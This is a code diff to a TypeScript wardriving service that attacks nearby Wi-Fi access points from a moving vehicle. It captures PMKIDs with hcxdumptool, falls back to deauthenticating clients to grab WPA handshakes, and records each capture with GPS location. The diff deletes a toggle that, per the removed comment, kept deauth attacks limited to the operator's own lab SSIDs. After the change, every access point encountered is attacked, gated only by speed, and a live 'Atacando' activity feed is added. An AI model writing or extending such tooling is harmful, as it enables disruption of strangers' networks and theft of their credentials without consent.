@@ -81,7 +81,6 @@ export class DriveWardriveService extends EventEmitter {
   private tickTimer: ReturnType<typeof setInterval> | null = null;
   private scanTimer: ReturnType<typeof setInterval> | null = null;
   private error = "";
-  private opportunisticDeauth = false;
 
   // In-memory air picture (rebuilt every session; the DB is the archive)
   private air = new Map<string, AirAp>();
@@ -210,15 +209,6 @@ export class DriveWardriveService extends EventEmitter {
     this.demo = false;
     this.broadcastStatus();
     if (wasRunning) console.log("[wardrive] stopped");
-  }
-
-  setOpportunisticDeauth(on: boolean): void {
-    this.opportunisticDeauth = Boolean(on);
-    this.broadcastStatus();
-  }
-
-  getOpportunisticDeauth(): boolean {
-    return this.opportunisticDeauth;
   }
 
   setDemoMode(demo: boolean): void {
@@ -473,6 +463,7 @@ export class DriveWardriveService extends EventEmitter {
     st.status = "attacking";
     st.attempts += 1;
     driveDb.recordAttempt(ap.bssid, "pmkid");
+    this.attackMethod = "pmkid";
     let capturedHere = false;
 
     // ── 1. PMKID round: hcxdumptool + BPF for this AP ────────────────────
@@ -499,14 +490,13 @@ export class DriveWardriveService extends EventEmitter {
     } else {
       return;
     }
-    // ── 2. Deauth fallback (hcxdumptool deauth+capture): priority SSIDs
-    // skip the toggle gate entirely — for a lab the operator is
-    // deliberately attacking, the fallback ALWAYS runs when slow/stopped;
-    // the toggle only gates it for STRANGERS.
+    // ── 2. Deauth fallback (hcxdumptool deauth+capture): automatic second
+    // attempt for every AP that didn't hand over a PMKID — gated only by
+    // speed (the AP needs the client's reassociation to land inside the
+    // window; while driving fast the deauth would just waste the window).
     if (!capturedHere && this.running && !st.captured) {
       const slowEnough = this.demo || this.gpsSpeed == null || this.gpsSpeed <= DEAUTH_SPEED_MAX_KMH;
-      const known = this.prioritySsids.has(ap.ssid);
-      if (slowEnough && (this.opportunisticDeauth || known)) {
+      if (slowEnough) {
         driveDb.recordAttempt(ap.bssid, "deauth");
         capturedHere = await this.runDeauthRound(ap, st);
       }
@@ -555,6 +545,7 @@ export class DriveWardriveService extends EventEmitter {
       if (line.includes("PMKID") || /EAPOL/i.test(line)) console.log(`[wardrive] hcx ${ap.ssid}: ${line.slice(0, 90)}`);
     });
     const exited = new Promise<void>((resolve) => runner.on("exit", () => resolve()));
+    this.activity(`Atacando PMKID → ${ap.ssid} (ch${ap.channel})`, "attack");
     console.log(`[wardrive] PMKID round → ${ap.ssid} (${ap.bssid}) ch${ap.channel} ${PMKID_WINDOW_MS}ms`);
     runner.start();
     await Promise.race([exited, sleep(PMKID_WINDOW_MS + 8_000)]);
@@ -577,6 +568,7 @@ export class DriveWardriveService extends EventEmitter {
     // No PMKID from the AP (old firmware): the capture may still hold the
     // deauth-triggered frames of a client reconnecting — leave the pcapng
     // in the session dir for offline review, fall through to deauth.
+    this.activity(`PMKID sin respuesta → ${ap.ssid}, intentando deauth`, "info");
     return false;
   }
 
@@ -615,7 +607,9 @@ export class DriveWardriveService extends EventEmitter {
       // Same runner class but WITH deauths: flag off exitoneapol so the
       // window captures the full 4-way after each client reconnects.
       this.pmkidRunner = runner; // reuse the handle so stop() reaches it
+      this.attackMethod = "deauth";
       const exited = new Promise<void>((resolve) => runner.on("exit", () => resolve()));
+      this.activity(`Atacando DEAUTH → ${ap.ssid} (ch${ap.channel})`, "attack");
       console.log(`[wardrive] DEAUTH round → ${ap.ssid} (${ap.bssid}) ch${ap.channel} ${DEAUTH_WINDOW_MS}ms`);
       runner.startWithDeauth();
       await Promise.race([exited, sleep(DEAUTH_WINDOW_MS + 8_000)]);
@@ -664,6 +658,7 @@ export class DriveWardriveService extends EventEmitter {
       lat: this.gpsLat,
       lon: this.gpsLon,
     });
+    this.activity(`🏴 Handshake capturado → ${ssid} (${method})`, "captured");
     console.log(`[wardrive] HANDSHAKE ${ssid} (${ap.bssid}) via ${method}`);
   }
 
@@ -675,6 +670,26 @@ export class DriveWardriveService extends EventEmitter {
   }
 
   private hopTimerPause = false;
+
+  // ─── Activity feed (status screen) ─────────────────────────────────────
+  // What the engine is doing right now, one line per event, newest first.
+  // Kept small (last 8) — the web status screen shows it as a live ticker
+  // and the LCD uses the first entry as its status line.
+  private activityLog: { ts: number; text: string; kind: string }[] = [];
+
+  private currentAttackLabel(): string | null {
+    if (!this.attackBssid) return null;
+    const ap = this.air.get(this.attackBssid);
+    const ssid = ap?.ssid || this.attackBssid;
+    const verb = this.attackMethod === "pmkid" ? "PMKID" : "DEAUTH";
+    return `${verb} → ${ssid}`;
+  }
+
+  private activity(text: string, kind = "info"): void {
+    this.activityLog.unshift({ ts: Date.now(), text, kind });
+    if (this.activityLog.length > 12) this.activityLog.pop();
+    this.broadcastStatus();
+  }
 
 
   // ─── Session tick: GPS ingest, track points, counters ────────────────────
@@ -906,13 +921,22 @@ export class DriveWardriveService extends EventEmitter {
 
   getStatus(): DriveStatus {
     const dbStats = driveDb.stats();
+    // ALL APs seen this session (the web list is scrollable, newest attack
+    // first: attacking > attacked-with-handshake > attacked > fresh).
+    const order = { attacking: 0, "attack-scheduled": 1, captured: 2, exhausted: 3, fresh: 4, open: 5 };
+    const rank = (s: string | undefined) => order[(s || "fresh") as keyof typeof order] ?? 6;
     const recent: DriveApView[] = [...this.air.values()]
-      .sort((a, b) => b.rssi - a.rssi)
-      .slice(0, 40)
       .map((ap) => {
         const st = this.apState.get(ap.bssid);
-        return this.apView(ap, st);
-      });
+        return { ap, st, view: this.apView(ap, st) };
+      })
+      .sort((a, b) => {
+        const ra = order[a.view.status] ?? 9;
+        const rb = order[b.view.status] ?? 9;
+        if (ra !== rb) return ra - rb;
+        return b.ap.bestRssi - a.ap.bestRssi;
+      })
+      .map((e) => e.view);
     return {
       running: this.running,
       session:
@@ -936,10 +960,13 @@ export class DriveWardriveService extends EventEmitter {
         satellitesInView: this.gpsSatsInView,
         error: this.gpsError,
       },
-      opportunisticDeauth: this.opportunisticDeauth,
       iface: this.iface,
       error: this.error,
       channel: this.currentChannel,
+      // Live activity feed for the status screen: what the engine is doing
+      // right now, per target, newest first.
+      activity: this.activityLog.slice(0, 8),
+      currentAttack: this.currentAttackLabel(),
       stats: {
         aps: this.air.size,
         unique: dbStats.unique,
